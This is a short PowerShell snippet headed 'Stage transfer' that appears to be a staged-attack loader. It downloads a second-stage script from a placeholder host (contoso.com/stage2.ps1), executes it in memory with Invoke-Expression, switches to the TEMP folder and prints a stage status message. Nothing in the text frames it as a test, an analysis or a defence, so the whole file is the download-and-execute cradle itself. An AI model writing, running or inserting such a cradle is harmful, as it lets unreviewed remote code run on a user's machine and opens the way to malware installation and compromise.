
<# Stage transfer #> $DownloadUrl = 'http://contoso.com/stage2.ps1'; $ScriptText = (New-Object System.Net.WebClient).DownloadString($DownloadUrl); IEX $ScriptText; Set-Location -Path $env:TEMP; Write-Output "stage 17 initialized"
